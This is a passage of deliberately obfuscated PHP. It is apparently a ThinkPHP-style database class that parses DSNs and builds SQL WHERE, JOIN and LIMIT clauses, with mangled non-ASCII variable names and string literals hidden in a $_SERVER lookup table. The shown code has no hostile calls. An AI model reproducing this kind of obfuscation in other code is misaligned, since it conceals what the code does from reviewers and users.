$cÊ∂Û©¬®Ç = new $AÉÀ¯ÕÊÔº($Fñã™∑¶“√); if ($däâ¶ë—‰Ω[734] != strtolower($Fñã™∑¶“√[$däâ¶ë—‰Ω[882]])) { $cÊ∂Û©¬®Ç->dbType = strtoupper($this->dbType); } else { $cÊ∂Û©¬®Ç->dbType = $this->_getDsnType($Fñã™∑¶“√[$däâ¶ë—‰Ω[833]]); } } else { think_exception(think_lang($däâ¶ë—‰Ω[885]) . $däâ¶ë—‰Ω[886] . $AÉÀ¯ÕÊÔº); } goto b∑œªéµí›; b∑œªéµí›: return $cÊ∂Û©¬®Ç; goto aí ¶ÿ¿Éò; aí ¶ÿ¿Éò: } public function __call($C¬Ú∂◊É∫Œ, $fÏÆïΩ…æÊ) { if (method_exists($this, $C¬Ú∂◊É∫Œ)) { return call_user_func_array(array($this, $C¬Ú∂◊É∫Œ), $fÏÆïΩ…æÊ); } } protected function _getDsnType($bìßó“Æ⁄Ñ) { $Cú§±Êã›≤ = explode($_SERVER[—Ω][4], $bìßó“Æ⁄Ñ); $E››€õÜ·ˆ = strtoupper(trim($Cú§±Êã›≤[0])); return $E››€õÜ·ˆ; } private function parseConfig($AõÏΩç–à¨ = '') { $cùˆÚ˜†˘ù =& $_SERVER[—Ω]; if (!empty($AõÏΩç–à¨) && is_string($AõÏΩç–à¨)) { $AõÏΩç–à¨ = $this->parseDSN($AõÏΩç–à¨); } elseif (is_array($AõÏΩç–à¨)) { $AõÏΩç–à¨ = array_change_key_case($AõÏΩç–à¨); $AõÏΩç–à¨ = array($cùˆÚ˜†˘ù[882] => $AõÏΩç–à¨[$cùˆÚ˜†˘ù[733]], $cùˆÚ˜†˘ù[806] => $AõÏΩç–à¨[$cùˆÚ˜†˘ù[887]], $cùˆÚ˜†˘ù[807] => $AõÏΩç–à¨[$cùˆÚ˜†˘ù[888]], $cùˆÚ˜†˘ù[804] => $AõÏΩç–à¨[$cùˆÚ˜†˘ù[889]], $cùˆÚ˜†˘ù[805] => $AõÏΩç–à¨[$cùˆÚ˜†˘ù[890]], $cùˆÚ˜†˘ù[17] => $AõÏΩç–à¨[$cùˆÚ˜†˘ù[891]], $cùˆÚ˜†˘ù[833] => $AõÏΩç–à¨[$cùˆÚ˜†˘ù[735]], $cùˆÚ˜†˘ù[13] => isset($AõÏΩç–à¨[$cùˆÚ˜†˘ù[892]]) ? $AõÏΩç–à¨[$cùˆÚ˜†˘ù[892]] : array()); } elseif (empty($AõÏΩç–à¨)) { if (think_config($cùˆÚ˜†˘ù[893]) && $cùˆÚ˜†˘ù[734] != strtolower(think_config($cùˆÚ˜†˘ù[894]))) { $AõÏΩç–à¨ = $this->parseDSN(think_config($cùˆÚ˜†˘ù[893])); } else { $AõÏΩç–à¨ = array($cùˆÚ˜†˘ù[882] => think_config($cùˆÚ˜†˘ù[894]), $cùˆÚ˜†˘ù[806] => think_config($cùˆÚ˜†˘ù[895]), $cùˆÚ˜†˘ù[807] => think_config($cùˆÚ˜†˘ù[896]), $cùˆÚ˜†˘ù[804] => think_config($cùˆÚ˜†˘ù[897]), $cùˆÚ˜†˘ù[805] => think_config($cùˆÚ˜†˘ù[898]), $cùˆÚ˜†˘ù[17] => think_config($cùˆÚ˜†˘ù[231]), $cùˆÚ˜†˘ù[833] => think_config($cùˆÚ˜†˘ù[893]), $cùˆÚ˜†˘ù[13] => think_config($cùˆÚ˜†˘ù[899])); } } return $AõÏΩç–à¨; } protected function initConnect($dë§€¶®êØ = true) { if (1 == think_config($_SERVER[—Ω][18])) { $this->_linkID = $this->multiConnect($dë§€¶®êØ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($D“ìÓµ“‘• = false) { $Få∂Æ«”Ú± =& $_SERVER[—Ω]; static $F§Ûæ¥ƒ≠ç = array(); if (empty($F§Ûæ¥ƒ≠ç)) { foreach ($this->config as $b‡ùƒÚ£é∏ => $Dç¡˜«Ö·á) { $F§Ûæ¥ƒ≠ç[$b‡ùƒÚ£é∏] = explode($Få∂Æ«”Ú±[47], $Dç¡˜«Ö·á); } } if (think_config($Få∂Æ«”Ú±[900])) { if ($D“ìÓµ“‘•) { $eûßé∏≈ºç = floor(mt_rand(0, think_config($Få∂Æ«”Ú±[901]) - 1)); } else { if (is_numeric(think_config($Få∂Æ«”Ú±[902]))) { $eûßé∏≈ºç = think_config($Få∂Æ«”Ú±[902]); } else { $eûßé∏≈ºç = floor(mt_rand(think_config($Få∂Æ«”Ú±[901]), count($F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[804]]) - 1)); } } } else { $eûßé∏≈ºç = floor(mt_rand(0, count($F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[804]]) - 1)); } $E¥ƒáªÉéô = array($Få∂Æ«”Ú±[806] => isset($F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[806]][$eûßé∏≈ºç]) ? $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[806]][$eûßé∏≈ºç] : $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[806]][0], $Få∂Æ«”Ú±[807] => isset($F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[807]][$eûßé∏≈ºç]) ? $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[807]][$eûßé∏≈ºç] : $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[807]][0], $Få∂Æ«”Ú±[804] => isset($F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[804]][$eûßé∏≈ºç]) ? $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[804]][$eûßé∏≈ºç] : $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[804]][0], $Få∂Æ«”Ú±[805] => isset($F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[805]][$eûßé∏≈ºç]) ? $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[805]][$eûßé∏≈ºç] : $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[805]][0], $Få∂Æ«”Ú±[17] => isset($F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[17]][$eûßé∏≈ºç]) ? $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[17]][$eûßé∏≈ºç] : $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[17]][0], $Få∂Æ«”Ú±[833] => isset($F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[833]][$eûßé∏≈ºç]) ? $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[833]][$eûßé∏≈ºç] : $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[833]][0], $Få∂Æ«”Ú±[13] => isset($F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[13]][$eûßé∏≈ºç]) ? $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[13]][$eûßé∏≈ºç] : $F§Ûæ¥ƒ≠ç[$Få∂Æ«”Ú±[13]][0]); return $this->connect($E¥ƒáªÉéô, $eûßé∏≈ºç); } public function parseDSN($eóÉÃòùﬁŒ) { $Aà‡ìÆÚÁÉ =& $_SERVER[—Ω]; if (empty($eóÉÃòùﬁŒ)) { return !1; } $AÌÒá™êïõ = parse_url($eóÉÃòùﬁŒ); if ($AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[165]]) { $fôí‰™£µ· = array($Aà‡ìÆÚÁÉ[882] => $AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[165]], $Aà‡ìÆÚÁÉ[806] => isset($AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[531]]) ? $AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[531]] : $Aà‡ìÆÚÁÉ[33], $Aà‡ìÆÚÁÉ[807] => isset($AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[903]]) ? $AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[903]] : $Aà‡ìÆÚÁÉ[33], $Aà‡ìÆÚÁÉ[804] => isset($AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[166]]) ? $AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[166]] : $Aà‡ìÆÚÁÉ[33], $Aà‡ìÆÚÁÉ[805] => isset($AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[167]]) ? $AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[167]] : $Aà‡ìÆÚÁÉ[33], $Aà‡ìÆÚÁÉ[17] => isset($AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[75]]) ? substr($AÌÒá™êïõ[$Aà‡ìÆÚÁÉ[75]], 1) : $Aà‡ìÆÚÁÉ[33]); } else { preg_match($Aà‡ìÆÚÁÉ[904], trim($eóÉÃòùﬁŒ), $dü‚…ÖÒÇ≠); $fôí‰™£µ· = array($Aà‡ìÆÚÁÉ[882] => $dü‚…ÖÒÇ≠[1], $Aà‡ìÆÚÁÉ[806] => $dü‚…ÖÒÇ≠[2], $Aà‡ìÆÚÁÉ[807] => $dü‚…ÖÒÇ≠[3], $Aà‡ìÆÚÁÉ[804] => $dü‚…ÖÒÇ≠[4], $Aà‡ìÆÚÁÉ[805] => $dü‚…ÖÒÇ≠[5], $Aà‡ìÆÚÁÉ[17] => $dü‚…ÖÒÇ≠[6]); } $fôí‰™£µ·[$Aà‡ìÆÚÁÉ[833]] = $Aà‡ìÆÚÁÉ[33]; return $fôí‰™£µ·; } protected function debug() { $E®Ëﬂòˆç¯ =& $_SERVER[—Ω]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $E®Ëﬂòˆç¯[905]; if (think_config($E®Ëﬂòˆç¯[906])) { think_status($E®Ëﬂòˆç¯[907]); think_trace($this->queryStr . $E®Ëﬂòˆç¯[908] . think_status($E®Ëﬂòˆç¯[20], $E®Ëﬂòˆç¯[907], 6) . $E®Ëﬂòˆç¯[909], $E®Ëﬂòˆç¯[33], $E®Ëﬂòˆç¯[910]); } } protected function parseLock($fê®’óäÃÆ = false) { $D†ÇŒ≥Ö∏ë =& $_SERVER[—Ω]; if (!$fê®’óäÃÆ) { return $D†ÇŒ≥Ö∏ë[33]; } if ($D†ÇŒ≥Ö∏ë[835] == $this->dbType) { return $D†ÇŒ≥Ö∏ë[911]; } return $D†ÇŒ≥Ö∏ë[912]; } protected function parseSet($BÁÂË‘∂Õ∫) { $aáÔ±æ”ù© =& $_SERVER[—Ω]; foreach ($BÁÂË‘∂Õ∫ as $DÇÂªÉÖ€Œ => $e∆ﬁÔéÇ·æ) { if (is_array($e∆ﬁÔéÇ·æ) && $aáÔ±æ”ù©[282] == $e∆ﬁÔéÇ·æ[0]) { $FƒÙÏ¨À«¿[] = $this->parseKey($DÇÂªÉÖ€Œ) . $aáÔ±æ”ù©[913] . $e∆ﬁÔéÇ·æ[1]; } elseif (is_scalar($e∆ﬁÔéÇ·æ) || is_null($e∆ﬁÔéÇ·æ)) { $FƒÙÏ¨À«¿[] = $this->parseKey($DÇÂªÉÖ€Œ) . $aáÔ±æ”ù©[913] . $this->parseValue($e∆ﬁÔéÇ·æ); } } return $aáÔ±æ”ù©[914] . implode($aáÔ±æ”ù©[47], $FƒÙÏ¨À«¿); } protected function bindParam($dÀçÉÉ√ÔË, $Eµ≈≥â∞•¯) { $this->bind[$_SERVER[—Ω][4] . $dÀçÉÉ√ÔË] = $Eµ≈≥â∞•¯; } protected function parseBind($b◊Ââ⁄≈Çπ) { $b◊Ââ⁄≈Çπ = array_merge($this->bind, $b◊Ââ⁄≈Çπ); $this->bind = array(); return $b◊Ââ⁄≈Çπ; } function parseKey(&$a–í≠ﬂùÙä, $d˘¿Ü…∆Ë = true) { if ($d˘¿Ü…∆Ë) { $a–í≠ﬂùÙä = $this->parseKeyCheck($a–í≠ﬂùÙä); } return $a–í≠ﬂùÙä; } function parseKeyCheck($c™Ö‹Ø–≈ª) { $d∞é—◊ÑÛà =& $_SERVER[—Ω]; $c™Ö‹Ø–≈ª = trim($c™Ö‹Ø–≈ª); if (!preg_match($d∞é—◊ÑÛà[915], $c™Ö‹Ø–≈ª)) { think_exception($d∞é—◊ÑÛà[916] . $c™Ö‹Ø–≈ª); } return $c™Ö‹Ø–≈ª; } protected function parseValue($F˘ã¿ëÆ◊ç) { $C±¢Öå¥òá =& $_SERVER[—Ω]; if (is_string($F˘ã¿ëÆ◊ç)) { $F˘ã¿ëÆ◊ç = $C±¢Öå¥òá[874] . $this->escapeString($F˘ã¿ëÆ◊ç) . $C±¢Öå¥òá[874]; } elseif (isset($F˘ã¿ëÆ◊ç[0]) && is_string($F˘ã¿ëÆ◊ç[0]) && strtolower($F˘ã¿ëÆ◊ç[0]) == $C±¢Öå¥òá[282]) { $F˘ã¿ëÆ◊ç = $this->escapeString($F˘ã¿ëÆ◊ç[1]); } elseif (is_array($F˘ã¿ëÆ◊ç)) { $F˘ã¿ëÆ◊ç = array_map(array($this, $C±¢Öå¥òá[875]), $F˘ã¿ëÆ◊ç); } elseif (is_bool($F˘ã¿ëÆ◊ç)) { $F˘ã¿ëÆ◊ç = $F˘ã¿ëÆ◊ç ? $C±¢Öå¥òá[83] : $C±¢Öå¥òá[464]; } elseif (is_null($F˘ã¿ëÆ◊ç)) { $F˘ã¿ëÆ◊ç = $C±¢Öå¥òá[101]; } return $F˘ã¿ëÆ◊ç; } protected function parseField($B±©∆»Óá∆) { $aï°¯∏Õ¢† =& $_SERVER[—Ω]; if (is_string($B±©∆»Óá∆) && strpos($B±©∆»Óá∆, $aï°¯∏Õ¢†[47])) { $B±©∆»Óá∆ = explode($aï°¯∏Õ¢†[47], $B±©∆»Óá∆); } if (is_array($B±©∆»Óá∆)) { $Dˆâí¿Ê∑· = array(); foreach ($B±©∆»Óá∆ as $AÇÍ°˘≥ö∑ => $Fπ√ò»Íáá) { if (!is_numeric($AÇÍ°˘≥ö∑)) { $Dˆâí¿Ê∑·[] = $this->parseKey($AÇÍ°˘≥ö∑) . $aï°¯∏Õ¢†[917] . $this->parseKey($Fπ√ò»Íáá); } else { $Dˆâí¿Ê∑·[] = $this->parseKey($Fπ√ò»Íáá); } } $C˜Öà·∑Âÿ = implode($aï°¯∏Õ¢†[47], $Dˆâí¿Ê∑·); } elseif (is_string($B±©∆»Óá∆) && !empty($B±©∆»Óá∆)) { $C˜Öà·∑Âÿ = $B±©∆»Óá∆; } else { $C˜Öà·∑Âÿ = $aï°¯∏Õ¢†[173]; } return $C˜Öà·∑Âÿ; } protected function parseTable($dæ¬‚»›éª) { $EÑªô‹Î‚» =& $_SERVER[—Ω]; if (is_array($dæ¬‚»›éª)) { $cπÉ„Ü¨ÿÃ = array(); foreach ($dæ¬‚»›éª as $BÑëïã£íñ => $f–°œïëÁë) { if (!is_numeric($BÑëïã£íñ)) { $cπÉ„Ü¨ÿÃ[] = $this->parseKey($BÑëïã£íñ) . $EÑªô‹Î‚»[50] . $this->parseKey($f–°œïëÁë); } else { $cπÉ„Ü¨ÿÃ[] = $this->parseKey($BÑëïã£íñ); } } $dæ¬‚»›éª = $cπÉ„Ü¨ÿÃ; } elseif (is_string($dæ¬‚»›éª)) { if (strstr($dæ¬‚»›éª, $EÑªô‹Î‚»[50])) { return $dæ¬‚»›éª; } $dæ¬‚»›éª = explode($EÑªô‹Î‚»[47], $dæ¬‚»›éª); array_walk($dæ¬‚»›éª, array($this, $EÑªô‹Î‚»[823])); } return $EÑªô‹Î‚»[918] . trim(implode($EÑªô‹Î‚»[919], $dæ¬‚»›éª), $EÑªô‹Î‚»[829]) . $EÑªô‹Î‚»[918]; } protected function parseWhere($B»Øã¿Ëü◊) { $bÔè®†∂¯À =& $_SERVER[—Ω]; $Dé¬∫ﬁÿÚô = $bÔè®†∂¯À[33]; if (is_string($B»Øã¿Ëü◊)) { $Dé¬∫ﬁÿÚô = $B»Øã¿Ëü◊; } else { $E§«ﬂã≠Ñô = isset($B»Øã¿Ëü◊[$bÔè®†∂¯À[920]]) ? strtoupper($B»Øã¿Ëü◊[$bÔè®†∂¯À[920]]) : $bÔè®†∂¯À[33]; if (in_array($E§«ﬂã≠Ñô, array($bÔè®†∂¯À[921], $bÔè®†∂¯À[922], $bÔè®†∂¯À[923]))) { $E§«ﬂã≠Ñô = $bÔè®†∂¯À[50] . $E§«ﬂã≠Ñô . $bÔè®†∂¯À[50]; unset($B»Øã¿Ëü◊[$bÔè®†∂¯À[920]]); } else { $E§«ﬂã≠Ñô = $bÔè®†∂¯À[924]; } foreach ($B»Øã¿Ëü◊ as $B¯∂”ßÒ∞— => $b£§ú⁄¥ﬁÂ) { $Dé¬∫ﬁÿÚô .= $bÔè®†∂¯À[262]; if (is_numeric($B¯∂”ßÒ∞—)) { $B¯∂”ßÒ∞— = $bÔè®†∂¯À[925]; } if (0 === strpos($B¯∂”ßÒ∞—, $bÔè®†∂¯À[70])) { $Dé¬∫ﬁÿÚô .= $this->parseThinkWhere($B¯∂”ßÒ∞—, $b£§ú⁄¥ﬁÂ); } else { if (!preg_match($bÔè®†∂¯À[926], trim($B¯∂”ßÒ∞—))) { think_exception(think_lang($bÔè®†∂¯À[927]) . $bÔè®†∂¯À[4] . $B¯∂”ßÒ∞—); } $aèÀ‰îŸ◊Ú = is_array($b£§ú⁄¥ﬁÂ) && isset($b£§ú⁄¥ﬁÂ[$bÔè®†∂¯À[928]]); $B¯∂”ßÒ∞— = trim($B¯∂”ßÒ∞—); if (strpos($B¯∂”ßÒ∞—, $bÔè®†∂¯À[268])) { $a ı≈ñ‘Ñ = explode($bÔè®†∂¯À[268], $B¯∂”ßÒ∞—); $F±ñÈìœ∫è = array(); foreach ($a ı≈ñ‘Ñ as $fû∂‚’€Ô‡ => $c¶ûù£Ù…◊) { $E¨Â‰–öûª = $aèÀ‰îŸ◊Ú ? $b£§ú⁄¥ﬁÂ[$fû∂‚’€Ô‡] : $b£§ú⁄¥ﬁÂ; $F±ñÈìœ∫è[] = $bÔè®†∂¯À[245] . $this->parseWhereItem($this->parseKey($c¶ûù£Ù…◊), $E¨Â‰–öûª) . $bÔè®†∂¯À[822]; } $Dé¬∫ﬁÿÚô .= implode($bÔè®†∂¯À[929], $F±ñÈìœ∫è); } elseif (strpos($B¯∂”ßÒ∞—, $bÔè®†∂¯À[269])) { $a ı≈ñ‘Ñ = explode($bÔè®†∂¯À[269], $B¯∂”ßÒ∞—); $F±ñÈìœ∫è = array(); foreach ($a ı≈ñ‘Ñ as $fû∂‚’€Ô‡ => $c¶ûù£Ù…◊) { $E¨Â‰–öûª = $aèÀ‰îŸ◊Ú ? $b£§ú⁄¥ﬁÂ[$fû∂‚’€Ô‡] : $b£§ú⁄¥ﬁÂ; $F±ñÈìœ∫è[] = $bÔè®†∂¯À[245] . $this->parseWhereItem($this->parseKey($c¶ûù£Ù…◊), $E¨Â‰–öûª) . $bÔè®†∂¯À[822]; } $Dé¬∫ﬁÿÚô .= implode($bÔè®†∂¯À[924], $F±ñÈìœ∫è); } else { $Dé¬∫ﬁÿÚô .= $this->parseWhereItem($this->parseKey($B¯∂”ßÒ∞—), $b£§ú⁄¥ﬁÂ); } } $Dé¬∫ﬁÿÚô .= $bÔè®†∂¯À[263] . $E§«ﬂã≠Ñô; } $Dé¬∫ﬁÿÚô = substr($Dé¬∫ﬁÿÚô, 0, -strlen($E§«ﬂã≠Ñô)); } return empty($Dé¬∫ﬁÿÚô) ? $bÔè®†∂¯À[33] : $bÔè®†∂¯À[930] . $Dé¬∫ﬁÿÚô; } protected function parseWhereItem($E“ˆƒ∆Ïû‰, $cÆ¡¥™â›—) { $EàùÍæ™Ù¬ =& $_SERVER[—Ω]; $BéêÑ∫»¿ú = $EàùÍæ™Ù¬[33]; if (is_array($cÆ¡¥™â›—)) { if (is_string($cÆ¡¥™â›—[0])) { $b¥âÕã„ÓÊ = strtolower($cÆ¡¥™â›—[0]); if (in_array($cÆ¡¥™â›—[0], array($EàùÍæ™Ù¬[913], $EàùÍæ™Ù¬[931], $EàùÍæ™Ù¬[932], $EàùÍæ™Ù¬[933], $EàùÍæ™Ù¬[934], $EàùÍæ™Ù¬[935]))) { $BéêÑ∫»¿ú .= $E“ˆƒ∆Ïû‰ . $EàùÍæ™Ù¬[50] . $cÆ¡¥™â›—[0] . $EàùÍæ™Ù¬[50] . $this->parseValue($cÆ¡¥™â›—[1]); } elseif (preg_match($EàùÍæ™Ù¬[936], $cÆ¡¥™â›—[0])) { $BéêÑ∫»¿ú .= $E“ˆƒ∆Ïû‰ . $EàùÍæ™Ù¬[50] . $this->exp[$b¥âÕã„ÓÊ] . $EàùÍæ™Ù¬[50] . $this->parseValue($cÆ¡¥™â›—[1]); } elseif (preg_match($EàùÍæ™Ù¬[937], $cÆ¡¥™â›—[0])) { if (is_array($cÆ¡¥™â›—[1])) { $FÆÈ≤›Ÿ€ = isset($cÆ¡¥™â›—[2]) ? strtoupper($cÆ¡¥™â›—[2]) : $EàùÍæ™Ù¬[922]; if (in_array($FÆÈ≤›Ÿ€, array($EàùÍæ™Ù¬[921], $EàùÍæ™Ù¬[922], $EàùÍæ™Ù¬[923]))) { $fÎñª˜˜œÂ = array(); foreach ($cÆ¡¥™â›—[1] as $E˘£û§¶á√) { $fÎñª˜˜œÂ[] = $E“ˆƒ∆Ïû‰ . $EàùÍæ™Ù¬[50] . $this->exp[$b¥âÕã„ÓÊ] . $EàùÍæ™Ù¬[50] . $this->parseValue($E˘£û§¶á√); } $BéêÑ∫»¿ú .= $EàùÍæ™Ù¬[245] . implode($EàùÍæ™Ù¬[50] . $FÆÈ≤›Ÿ€ . $EàùÍæ™Ù¬[50], $fÎñª˜˜œÂ) . $EàùÍæ™Ù¬[822]; } } else { $BéêÑ∫»¿ú .= $E“ˆƒ∆Ïû‰ . $EàùÍæ™Ù¬[50] . $this->exp[$b¥âÕã„ÓÊ] . $EàùÍæ™Ù¬[50] . $this->parseValue($cÆ¡¥™â›—[1]); } } elseif ($EàùÍæ™Ù¬[282] == $b¥âÕã„ÓÊ) { $BéêÑ∫»¿ú .= $EàùÍæ™Ù¬[820] . $E“ˆƒ∆Ïû‰ . $EàùÍæ™Ù¬[50] . $cÆ¡¥™â›—[1] . $EàùÍæ™Ù¬[938]; } elseif (preg_match($EàùÍæ™Ù¬[939], $cÆ¡¥™â›—[0])) { if (isset($cÆ¡¥™â›—[2]) && $EàùÍæ™Ù¬[282] == $cÆ¡¥™â›—[2]) { $BéêÑ∫»¿ú .= $E“ˆƒ∆Ïû‰ . $EàùÍæ™Ù¬[50] . $this->exp[$b¥âÕã„ÓÊ] . $EàùÍæ™Ù¬[50] . $cÆ¡¥™â›—[1]; } else { if (is_string($cÆ¡¥™â›—[1])) { $cÆ¡¥™â›—[1] = explode($EàùÍæ™Ù¬[47], $cÆ¡¥™â›—[1]); } $eıÚûâË±π = implode($EàùÍæ™Ù¬[47], $this->parseValue($cÆ¡¥™â›—[1])); $BéêÑ∫»¿ú .= $E“ˆƒ∆Ïû‰ . $EàùÍæ™Ù¬[50] . $this->exp[$b¥âÕã„ÓÊ] . $EàùÍæ™Ù¬[820] . $eıÚûâË±π . $EàùÍæ™Ù¬[822]; } } elseif (preg_match($EàùÍæ™Ù¬[940], $cÆ¡¥™â›—[0])) { $e¢¯‘™ﬁêﬂ = is_string($cÆ¡¥™â›—[1]) ? explode($EàùÍæ™Ù¬[47], $cÆ¡¥™â›—[1]) : $cÆ¡¥™â›—[1]; $BéêÑ∫»¿ú .= $EàùÍæ™Ù¬[820] . $E“ˆƒ∆Ïû‰ . $EàùÍæ™Ù¬[50] . $this->exp[$b¥âÕã„ÓÊ] . $EàùÍæ™Ù¬[50] . $this->parseValue($e¢¯‘™ﬁêﬂ[0]) . $EàùÍæ™Ù¬[924] . $this->parseValue($e¢¯‘™ﬁêﬂ[1]) . $EàùÍæ™Ù¬[263]; } else { think_exception(think_lang($EàùÍæ™Ù¬[927]) . $EàùÍæ™Ù¬[4] . $cÆ¡¥™â›—[0]); } } else { $aÜË˜õÂ¬ = count($cÆ¡¥™â›—); $bêŒ≤“Ôœ≥ = isset($cÆ¡¥™â›—[$aÜË˜õÂ¬ - 1]) ? strtoupper($cÆ¡¥™â›—[$aÜË˜õÂ¬ - 1]) : $EàùÍæ™Ù¬[33]; if (in_array($bêŒ≤“Ôœ≥, array($EàùÍæ™Ù¬[921], $EàùÍæ™Ù¬[922], $EàùÍæ™Ù¬[923]))) { $aÜË˜õÂ¬ = $aÜË˜õÂ¬ - 1; } else { $bêŒ≤“Ôœ≥ = $EàùÍæ™Ù¬[921]; } for ($BÉπÑÜﬂŒ— = 0; $BÉπÑÜﬂŒ— < $aÜË˜õÂ¬; $BÉπÑÜﬂŒ—++) { $e¢¯‘™ﬁêﬂ = is_array($cÆ¡¥™â›—[$BÉπÑÜﬂŒ—]) ? $cÆ¡¥™â›—[$BÉπÑÜﬂŒ—][1] : $cÆ¡¥™â›—[$BÉπÑÜﬂŒ—]; if ($EàùÍæ™Ù¬[282] == strtolower($cÆ¡¥™â›—[$BÉπÑÜﬂŒ—][0])) { $BéêÑ∫»¿ú .= $EàùÍæ™Ù¬[245] . $E“ˆƒ∆Ïû‰ . $EàùÍæ™Ù¬[50] . $e¢¯‘™ﬁêﬂ . $EàùÍæ™Ù¬[938] . $bêŒ≤“Ôœ≥ . $EàùÍæ™Ù¬[50]; } else { $dŸÔƒπÆÑ› = is_array($cÆ¡¥™â›—[$BÉπÑÜﬂŒ—]) ? $this->exp[strtolower($cÆ¡¥™â›—[$BÉπÑÜﬂŒ—][0])] : $EàùÍæ™Ù¬[913]; if (!$dŸÔƒπÆÑ› && is_array($cÆ¡¥™â›—[$BÉπÑÜﬂŒ—]) && in_array($cÆ¡¥™â›—[$BÉπÑÜﬂŒ—][0], array($EàùÍæ™Ù¬[913], $EàùÍæ™Ù¬[931], $EàùÍæ™Ù¬[932], $EàùÍæ™Ù¬[933], $EàùÍæ™Ù¬[934], $EàùÍæ™Ù¬[935]))) { $dŸÔƒπÆÑ› = $cÆ¡¥™â›—[$BÉπÑÜﬂŒ—][0]; } $BéêÑ∫»¿ú .= $EàùÍæ™Ù¬[245] . $E“ˆƒ∆Ïû‰ . $EàùÍæ™Ù¬[50] . $dŸÔƒπÆÑ› . $EàùÍæ™Ù¬[50] . $this->parseValue($e¢¯‘™ﬁêﬂ) . $EàùÍæ™Ù¬[938] . $bêŒ≤“Ôœ≥ . $EàùÍæ™Ù¬[50]; } } $BéêÑ∫»¿ú = substr($BéêÑ∫»¿ú, 0, -4); } } else { $BéêÑ∫»¿ú .= $E“ˆƒ∆Ïû‰ . $EàùÍæ™Ù¬[941] . $this->parseValue($cÆ¡¥™â›—); } return $BéêÑ∫»¿ú; } protected function parseThinkWhere($F¶ºΩ˜ï∏À, $b‡Ò£ıëﬁ¥) { $C©”∆ÖóŒñ =& $_SERVER[—Ω]; $BÆíÒ≈ìÑÖ = $C©”∆ÖóŒñ[33]; switch ($F¶ºΩ˜ï∏À) { case $C©”∆ÖóŒñ[336]: $BÆíÒ≈ìÑÖ = $b‡Ò£ıëﬁ¥; break; case $C©”∆ÖóŒñ[925]: $BÆíÒ≈ìÑÖ = is_string($b‡Ò£ıëﬁ¥) ? $b‡Ò£ıëﬁ¥ : substr($this->parseWhere($b‡Ò£ıëﬁ¥), 6); break; case $C©”∆ÖóŒñ[942]: parse_str($b‡Ò£ıëﬁ¥, $cª‹‚•ì‡¥); if (isset($cª‹‚•ì‡¥[$C©”∆ÖóŒñ[920]])) { $B·ùäºÖ›Ü = $C©”∆ÖóŒñ[50] . strtoupper($cª‹‚•ì‡¥[$C©”∆ÖóŒñ[920]]) . $C©”∆ÖóŒñ[50]; unset($cª‹‚•ì‡¥[$C©”∆ÖóŒñ[920]]); } else { $B·ùäºÖ›Ü = $C©”∆ÖóŒñ[924]; } $e‡Êî“›ÆÒ = array(); foreach ($cª‹‚•ì‡¥ as $f√⁄º∫§î¿ => $aÖﬂ∏Ë•ì ) { $e‡Êî“›ÆÒ[] = $this->parseKey($f√⁄º∫§î¿) . $C©”∆ÖóŒñ[941] . $this->parseValue($aÖﬂ∏Ë•ì ); } $BÆíÒ≈ìÑÖ = implode($B·ùäºÖ›Ü, $e‡Êî“›ÆÒ); break; } return $BÆíÒ≈ìÑÖ; } protected function parseLimit($e‘⁄™•££à) { $CÉ»Ù‹ÿö‰ =& $_SERVER[—Ω]; return !empty($e‘⁄™•££à) ? $CÉ»Ù‹ÿö‰[48] . $e‘⁄™•££à . $CÉ»Ù‹ÿö‰[50] : $CÉ»Ù‹ÿö‰[33]; } protected function parseJoin($b¨ÍÉ•ûÛΩ) { $f°ñÇô·®ç =& $_SERVER[—Ω]; $Cπ¡∞·≈◊‚ = $f°ñÇô·®ç[33]; if (!empty($b¨ÍÉ•ûÛΩ)) { if (is_array($b¨ÍÉ•ûÛΩ)) { foreach ($b¨ÍÉ•ûÛΩ as $e«ÙŒ⁄ª—Ÿ => $d⁄™Ü¶ß´°) { if (!1 !== stripos($d⁄™Ü¶ß´°, $f°ñÇô·®ç[943])) { $Cπ¡∞·≈◊‚ .= $f°ñÇô·®ç[50] . $d⁄™Ü¶ß´°; } else { $Cπ¡∞·≈◊‚ .= $f°ñÇô·®ç[944] . $d⁄™Ü¶ß´°; } } } else { $Cπ¡∞·≈◊‚ .= $f°ñÇô·®ç[944] . $b¨ÍÉ•ûÛΩ; } } $Cπ¡∞·≈◊‚ = preg_replace($f°ñÇô·®ç[945], think_config($f°ñÇô·®ç[847]) . $f°ñÇô·®ç[946], $Cπ¡∞·≈◊‚); return $Cπ¡∞·≈◊‚; } protected function parseOrder($Déâﬁâπ¬Û) { $C‚—Œ¥…¢ı =& $_SERVER[—Ω]; if (is_array($Déâﬁâπ¬Û)) { $aàªÂﬂÔßã 